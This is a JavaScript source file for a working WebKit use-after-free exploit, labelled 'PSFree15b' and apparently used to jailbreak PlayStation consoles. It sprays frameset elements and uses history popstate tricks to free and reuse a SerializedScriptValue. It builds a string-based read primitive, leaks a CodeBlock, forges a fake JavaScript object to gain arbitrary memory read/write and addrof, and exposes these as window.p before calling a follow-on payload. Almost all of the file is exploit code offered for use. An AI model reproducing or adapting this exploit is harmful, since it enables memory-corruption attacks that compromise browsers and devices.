import { Int, KB, MB } from './offset.js';
import { die, DieError, debug_log, clear_log, sleep, hex, hex_np, align, BufferView, Memory, mem, } from './utils.js';
import * as config from './config.js';
import * as off from './offset.js';
addEventListener('unhandledrejection', event => {
    const reason = event.reason;
    alert(
        'Unhandled rejection\n'
        + `${reason}\n`
        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
        + `${reason.stack}`
    );
});
addEventListener('error', event => {
    const reason = event.error;
    alert(
        'Unhandled error\n'
        + `${reason}\n`
        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
        + `${reason.stack}`
    );
    return true;
});
/*const [is_ps4, version] = (() => {
    const value = config.target;
    const is_ps4 = (value & 0x10000) === 0;
    const version = value & 0xffff;
    const [lower, upper] = (() => {
        if (is_ps4) {
            return [0x600, 0x1000];
        } else {
            return [0x100, 0x600];
        }
    })();
    if (!(lower <= version && version < upper)) {
        throw RangeError(`invalid config.target: ${hex(value)}`);
    }
    return [is_ps4, version];
})();*/
/*const ssv_len = (() => {
    if (0x600 <= config.target && config.target < 0x650) {
        return 0x58;
    }
    if (config.target >= 0x900) {
        return 0x50;
    }
    if (0x650 <= config.target && config.target < 0x900) {
        return 0x48;
    }
})();*/
const ssv_len = 0x50;
const num_fsets = 0x180;
const num_spaces = 0x40;
const num_adjs = 6;
const num_reuses = 0x400;
const num_strs = 0x200;
const num_leaks = 0x100;
const rows = ','.repeat(ssv_len / 8 - 2);
const original_strlen = ssv_len - off.size_strimpl;
const original_loc = location.pathname;
function gc() {
    new Uint8Array(4 * MB);
}
function sread64(str, offset) {
    const low = (
        str.charCodeAt(offset)
        | str.charCodeAt(offset + 1) << 8
        | str.charCodeAt(offset + 2) << 16
        | str.charCodeAt(offset + 3) << 24
    );
    const high = (
        str.charCodeAt(offset + 4)
        | str.charCodeAt(offset + 5) << 8
        | str.charCodeAt(offset + 6) << 16
        | str.charCodeAt(offset + 7) << 24
    );
    return new Int(low, high);
}
function prepare_uaf() {
    const fsets = [];
    const indices = [];
    function alloc_fs(fsets, size) {
        for (let i = 0; i < size / 2; i++) {
            const fset = document.createElement('frameset');
            fset.rows = rows;
            fset.cols = rows;
            fsets.push(fset);
        }
    }
    history.pushState('state0', ''); // new line
    alloc_fs(fsets, num_fsets);
    history.pushState('state1', '', original_loc + '#foo');
    indices.push(fsets.length);
    alloc_fs(fsets, num_spaces);
    history.pushState('state1', '', original_loc + '#foo');
    indices.push(fsets.length);
    alloc_fs(fsets, num_fsets);
    history.pushState('state2', '');
    return [fsets, indices];
}
async function uaf_ssv(fsets, index, save_pop=false) {
    const views = [];
    const input = document.createElement('input');
    const foo = document.createElement('a');
    foo.id = 'foo';
    debug_log(`ssv_len: ${hex(ssv_len)}`);
    let pop = null;
    let num_blurs = 0;
    const pop_promise = new Promise((resolve, reject) => {
        function onpopstate(event) {
            debug_log('pop came');
            if (num_blurs === 0) {
                const r = reject;
                r(new DieError(`pop came before blur. blurs: ${num_blurs}`));
            }
            pop = event;
            resolve();
        }
        addEventListener('popstate', onpopstate, {once: true});
    });
    function onblur() {
        debug_log('blur came');
        if (num_blurs > 0)  {
            die(`multiple blurs. blurs: ${num_blurs}`);
        }
        history.replaceState('state3', '', original_loc);
        for (let i = index - num_adjs/2; i < index + num_adjs/2; i++) {
            fsets[i].rows = '';
            fsets[i].cols = '';
        }
        for (let i = 0; i < num_reuses; i++) {
            const view = new Uint8Array(new ArrayBuffer(ssv_len));
            view[0] = 0x41;
            views.push(view);
        }
        num_blurs++;
    }
    input.addEventListener('blur', onblur);
    document.body.append(input);
    document.body.append(foo);
    debug_log(`readyState now: ${document.readyState}`);
    if (document.readyState !== 'complete') {
        await new Promise(resolve => {
            document.addEventListener('readystatechange', function foo() {
                if (document.readyState === 'complete') {
                    document.removeEventListener('readystatechange', foo);
                    resolve();
                }
            });
        });
    }
    debug_log(`readyState now: ${document.readyState}`);
    await new Promise(resolve => {
        input.addEventListener('focus', resolve, {once: true});
        input.focus();
    });
    history.back();
    await pop_promise;
    input.removeEventListener('blur', onblur);
    debug_log('done await popstate');
    for (const [i, view] of views.entries()) {
        if (view[0] !== 0x41) {
            debug_log(`view index: ${hex(i)}`);
            debug_log('found view:');
            debug_log(view);
            input.remove();
            foo.remove();
            view[0] = 1;
            view.fill(0, 1);
            if (save_pop) {
                return [new BufferView(view.buffer), pop];
            }
            return new BufferView(view.buffer);
        }
    }
    die('failed SerializedScriptValue UaF');  
}
class Reader {
    constructor(rstr, rstr_view) {
        this.rstr = rstr;
        this.rstr_view = rstr_view;
        this.m_data = rstr_view.read64(off.strimpl_m_data);
    }
    read8_at(offset) {
        return this.rstr.charCodeAt(offset);
    }
    read32_at(offset) {
        const str = this.rstr;
        return (
            str.charCodeAt(offset)
            | str.charCodeAt(offset + 1) << 8
            | str.charCodeAt(offset + 2) << 16
            | str.charCodeAt(offset + 3) << 24
        ) >>> 0;
    }
    read64_at(offset) {
        return sread64(this.rstr, offset);
    }
    read64(addr) {
        this.rstr_view.write64(off.strimpl_m_data, addr);
        return sread64(this.rstr, 0);
    }
    set_addr(addr) {
        this.rstr_view.write64(off.strimpl_m_data, addr);
    }
    restore() {
        this.rstr_view.write64(off.strimpl_m_data, this.m_data);
        this.rstr_view.write32(off.strimpl_strlen, original_strlen);
    }
}
async function make_rdr(view) {
    let str_wait = 0;
    const strs = [];
    const u32 = new Uint32Array(1);
    const u8 = new Uint8Array(u32.buffer);
    const marker_offset = original_strlen - 4;
    const pad = 'B'.repeat(marker_offset);
    debug_log('start string spray');
    while (true) {
        for (let i = 0; i < num_strs; i++) {
            u32[0] = i;
            const str = [pad, String.fromCodePoint(...u8)].join('');
            strs.push(str);
        }
        if (view.read32(off.strimpl_inline_str) === 0x42424242) {
            view.write32(off.strimpl_strlen, 0xffffffff);
            break;
        }
        strs.length = 0;
        gc();
        await sleep();
        str_wait++;
    }
    debug_log(`JSString reused memory at loop: ${str_wait}`);
    const idx = view.read32(off.strimpl_inline_str + marker_offset);
    debug_log(`str index: ${hex(idx)}`);
    debug_log('view:');
    debug_log(view);
    const rstr = Error(strs[idx]).message;
    debug_log(`str len: ${hex(rstr.length)}`);
    if (rstr.length === 0xffffffff) {
        debug_log('confirmed correct leaked');
        const addr = (
            view.read64(off.strimpl_m_data)
            .sub(off.strimpl_inline_str)
        );
        debug_log(`view's buffer address: ${addr}`);
        return new Reader(rstr, view);
    }
    die("JSString wasn't modified");
}
const cons_len = ssv_len - 8*5;
const bt_offset = 0;
const idx_offset = ssv_len - 8*3;
const strs_offset = ssv_len - 8*2;
const src_part = (() => {
    let res = 'var f = 0x11223344;\n';
    for (let i = 0; i < cons_len; i += 8) {
        res += `var a${i} = ${num_leaks + i};\n`;
    }
    return res;
})();
async function leak_code_block(reader, bt_size) {
    const rdr = reader;
    const bt = [];
    for (let i = 0; i < bt_size - 0x10; i += 8) {
        bt.push(i);
    }
    const slen = ssv_len;
    const bt_part = `var bt = [${bt}];\nreturn bt;\n`;
    const part = bt_part + src_part;
    const cache = [];
    for (let i = 0; i < num_leaks; i++) {
        cache.push(part + `var idx = ${i};\nidx\`foo\`;`);
    }
    const chunkSize = 128 * KB;
    const smallPageSize = 4 * KB;
    const search_addr = align(rdr.m_data, chunkSize);
    debug_log(`search addr: ${search_addr}`);
    debug_log(`func_src:\n${cache[0]}\nfunc_src end`);
    debug_log('start find CodeBlock');
    let winning_off = null;
    let winning_idx = null;
    let winning_f = null;
    let find_cb_loop = 0;
    let fp = 0;
    rdr.set_addr(search_addr);
    loop: while (true) {
        const funcs = [];
        for (let i = 0; i < num_leaks; i++) {
            const f = Function(cache[i]);
            f();
            funcs.push(f);
        }
        for (let p = 0; p < chunkSize; p += smallPageSize) {
            for (let i = p; i < p + smallPageSize; i += slen) {
                if (rdr.read32_at(i + 8) !== 0x11223344) {
                    continue;
                }
                rdr.set_addr(rdr.read64_at(i + strs_offset));
                const m_type = rdr.read8_at(5);
                if (m_type !== 0) {
                    rdr.set_addr(search_addr);
                    winning_off = i;
                    winning_idx = rdr.read32_at(i + idx_offset);
                    winning_f = funcs[winning_idx];
                    break loop;
                }
                rdr.set_addr(search_addr);
                fp++;
            }
        }
        find_cb_loop++;
        gc();
        await sleep();
    }
    debug_log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
    debug_log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);
    debug_log('CodeBlock.m_constantRegisters.m_buffer:');
    rdr.set_addr(search_addr.add(winning_off));
    for (let i = 0; i < slen; i += 8) {
        debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
    }
    const bt_addr = rdr.read64_at(bt_offset);
    const strs_addr = rdr.read64_at(strs_offset);
    debug_log(`immutable butterfly addr: ${bt_addr}`);
    debug_log(`string array passed to tag addr: ${strs_addr}`);
    debug_log('JSImmutableButterfly:');
    rdr.set_addr(bt_addr);
    for (let i = 0; i < bt_size; i += 8) {
        debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
    }
    debug_log('string array:');
    rdr.set_addr(strs_addr);
    for (let i = 0; i < off.size_jsobj; i += 8) {
        debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
    }
    return [winning_f, bt_addr, strs_addr];
}
function make_ssv_data(ssv_buf, view, view_p, addr, size) {
    /*const size_abc = (() => {
        if (is_ps4) {
            return version >= 0x900 ? 0x18 : 0x20;
        } else {
            return version >= 0x300 ? 0x18 : 0x20;
        }
    })();*/
    const size_abc = 0x900 ? 0x18 : 0x20;
    const data_len = 9;
    const size_vector = 0x10;
    const off_m_data = 8;
    const off_m_abc = 0x18;
    const voff_vec_abc = 0;
    const voff_abc = voff_vec_abc + size_vector;
    const voff_data = voff_abc + size_abc;
    ssv_buf.write64(off_m_data, view_p.add(voff_data));
    ssv_buf.write32(off_m_data + 8, data_len);
    ssv_buf.write64(off_m_data + 0xc, data_len);
    const CurrentVersion = 6;
    const ArrayBufferTransferTag = 23;
    view.write32(voff_data, CurrentVersion);
    view[voff_data + 4] = ArrayBufferTransferTag;
    view.write32(voff_data + 5, 0);
    ssv_buf.write64(off_m_abc, view_p.add(voff_vec_abc));
    view.write64(voff_vec_abc, view_p.add(voff_abc));
    view.write32(voff_vec_abc + 8, 1);
    view.write32(voff_vec_abc + 0xc, 1);
    if (size_abc === 0x20) {
        view.write64(voff_abc + 0x10, addr);
        view.write32(voff_abc + 0x18, size);
    } else {
        view.write64(voff_abc + 0, addr);
        view.write32(voff_abc + 0x14, size);
    }
}
async function make_arw(reader, view2, pop) {
    const rdr = reader;
    const fakeobj_off = 0x20;
    const fakebt_base = fakeobj_off + off.size_jsobj;
    const indexingHeader_size = 8;
    const arrayStorage_size = 0x18;
    const propertyStorage = 8;
    const fakebt_off = fakebt_base + indexingHeader_size + propertyStorage;
    debug_log('STAGE: leak CodeBlock');
    const bt_size = 0x10 + fakebt_off + arrayStorage_size;
    const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);
    const view = rdr.rstr_view;
    const view_p = rdr.m_data.sub(off.strimpl_inline_str);
    const view_save = new Uint8Array(view);
    view.fill(0);
    make_ssv_data(view2, view, view_p, bt_addr, bt_size);
    const bt = new BufferView(pop.state);
    view.set(view_save);
    debug_log('ArrayBuffer pointing to JSImmutableButterfly:');
    for (let i = 0; i < bt.byteLength; i += 8) {
        debug_log(`${bt.read64(i)} | ${hex(i)}`);
    }
    bt.write32(8, 0);
    bt.write32(0xc, 0);
    const val_true = 7;
    const strs_cell = rdr.read64(strs_addr);
    bt.write64(fakeobj_off, strs_cell);
    bt.write64(fakeobj_off + off.js_butterfly, bt_addr.add(fakebt_off));
    bt.write64(fakebt_off - 0x10, val_true);
    bt.write32(fakebt_off - 8, 1);
    bt.write32(fakebt_off - 8 + 4, 1);
    bt.write64(fakebt_off, 0);
    bt.write32(fakebt_off + 8, 0);
    bt.write32(fakebt_off + 0xc, 1);
    bt.write64(fakebt_off + 0x10, val_true);
    bt.write64(0x10, bt_addr.add(fakeobj_off));
    bt.write32(8, 1);
    bt.write32(0xc, 1);
    const fake = func()[0];
    debug_log(`fake.raw: ${fake.raw}`);
    debug_log(`fake[0]: ${fake[0]}`);
    debug_log(`fake: [${fake}]`);
    const test_val = 3;
    debug_log(`test setting fake[0] to ${test_val}`);
    fake[0] = test_val;
    if (fake[0] !== test_val) {
        die(`unexpected fake[0]: ${fake[0]}`);
    }
    function addrof(obj) {
        fake[0] = obj;
        return bt.read64(fakebt_off + 0x10);
    }
    const worker = new DataView(new ArrayBuffer(1));
    const main_template = new Uint32Array(new ArrayBuffer(off.size_view));
    const leaker = {addr: null, foo: 0x6161};
    const worker_p = addrof(worker);
    const main_p = addrof(main_template);
    const leaker_p = addrof(leaker);
    const scaled_sview = off.size_view / 4;
    const faker = new Uint32Array(scaled_sview);
    const faker_p = addrof(faker);
    const faker_vector = rdr.read64(faker_p.add(off.view_m_vector));
    const vector_idx = off.view_m_vector / 4;
    const length_idx = off.view_m_length / 4;
    const mode_idx = off.view_m_mode / 4;
    const bt_idx = off.js_butterfly / 4;
    faker[vector_idx] = worker_p.low;
    faker[vector_idx + 1] = worker_p.high;
    faker[length_idx] = scaled_sview;
    rdr.set_addr(main_p);
    faker[mode_idx] = rdr.read32_at(off.view_m_mode);
    faker[0] = rdr.read32_at(0);
    faker[1] = rdr.read32_at(4);
    faker[bt_idx] = rdr.read32_at(off.js_butterfly);
    faker[bt_idx + 1] = rdr.read32_at(off.js_butterfly + 4);
    bt.write64(fakebt_off + 0x10, faker_vector);
    const main = fake[0];
    debug_log('main (pointing to worker):');
    for (let i = 0; i < off.size_view; i += 8) {
        const idx = i / 4;
        debug_log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
    }
    new Memory(main, worker, leaker, leaker_p.add(off.js_inline_prop));
    debug_log('achieved arbitrary r/w');
    rdr.restore();
    view.write32(0, -1);
    view2.write32(0, -1);
    make_arw._buffer = bt.buffer;
}
async function run() {
    try{
    StartTimer();
    showMessage("Webkit exploit (PSFree15b) (Step 0 - UaF SSV)"),    
    debug_log('STAGE: UaF SSV');
    const [fsets, indices] = prepare_uaf();
    const view = await uaf_ssv(fsets, indices[1]);
    showMessage("Webkit exploit (PSFree15b) (Step 1 - Read primitive)"),    
    debug_log('STAGE: get string relative read primitive');
    const rdr = await make_rdr(view);
    const [view2, pop] = await uaf_ssv(fsets, indices[0], true);   
    for (const fset of fsets) {
        fset.rows = '';
        fset.cols = '';
    }
    showMessage("Webkit exploit (PSFree15b) (Step 2 - Read/Write primitive)"),
    debug_log('STAGE: achieve arbitrary read/write primitive');
    await make_arw(rdr, view2, pop);
    window.p = {
        read1(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read8(addr);
            return res;
        },
        read2(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read16(addr);
            return res;
        },
        read4(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read32(addr);
            return res;
        },
        read8(addr) {
            addr = new Int(addr.low, addr.hi);
            const res = mem.read64(addr);
            return new int64(res.low, res.high);
        },
        write1(addr, value) {
            addr = new Int(addr.low, addr.hi);
            mem.write8(addr, value);
        },
        write2(addr, value) {
            addr = new Int(addr.low, addr.hi);
            mem.write16(addr, value);
        },
        write4(addr, value) {
            addr = new Int(addr.low, addr.hi);
            mem.write32(addr, value);
        },
        write8(addr, value) {
            addr = new Int(addr.low, addr.hi);
            if (value instanceof int64) {
                value = new Int(value.low, value.hi);
                mem.write64(addr, value);
            } else {
                mem.write64(addr, new Int(value));
            }

        },
        leakval(obj) {
            const res = mem.addrof(obj);
            return new int64(res.low, res.high);
        }
    };       
    run_hax();
    } catch (error) {
        debug_log("[!] Webkit exploit failed: " + error);
        debug_log("[+] Retrying in 2 seconds...");
        await new Promise((resolve) => setTimeout(resolve, 2000));
        window.location.reload();
        return; // this is necessary
    }  
}
setTimeout(run, 1500);
